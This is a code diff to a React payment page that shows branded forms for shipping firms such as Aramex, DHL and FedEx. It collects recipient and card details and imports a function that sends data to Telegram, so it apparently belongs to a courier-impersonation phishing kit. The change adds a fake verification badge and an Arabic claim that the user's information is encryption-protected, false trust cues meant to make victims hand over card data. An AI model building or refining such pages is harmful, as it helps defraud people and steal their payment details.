@@ -9,7 +9,8 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, BadgeCheck, Lock } from "lucide-react";
+import ServiceBadge from "@/components/ServiceBadge";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -168,16 +169,35 @@ const PaymentRecipient = () => {
             
             <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
               <form onSubmit={handleProceed}>
-                <div className="flex items-center justify-between mb-6 sm:mb-8">
+                <div className="flex items-center justify-between mb-4 sm:mb-6">
                   <h1 className="text-xl sm:text-3xl font-bold">معلومات المستلم</h1>
                   
                   <div
-                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
+                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg relative"
                     style={{
                       background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                     }}
                   >
                     <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
+                    <div className="absolute -top-1 -left-1 bg-white rounded-full p-1">
+                      <BadgeCheck className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.primary }} />
+                    </div>
+                  </div>
+                </div>
+
+                {/* Service Badge and Security Notice */}
+                <div className="mb-6 sm:mb-8">
+                  <div className="flex justify-center mb-4">
+                    <ServiceBadge 
+                      serviceKey={serviceKey}
+                      serviceName={serviceName}
+                      size="lg"
+                    />
+                  </div>
+                  <div className="flex items-center justify-center gap-2 p-2 sm:p-3 rounded-lg bg-muted/50">
+                    <Shield className="w-4 h-4" style={{ color: branding.colors.primary }} />
+                    <span className="text-xs sm:text-sm font-semibold">معلوماتك محمية بتقنية التشفير</span>
+                    <Lock className="w-4 h-4" style={{ color: branding.colors.secondary }} />
                   </div>
                 </div>
 
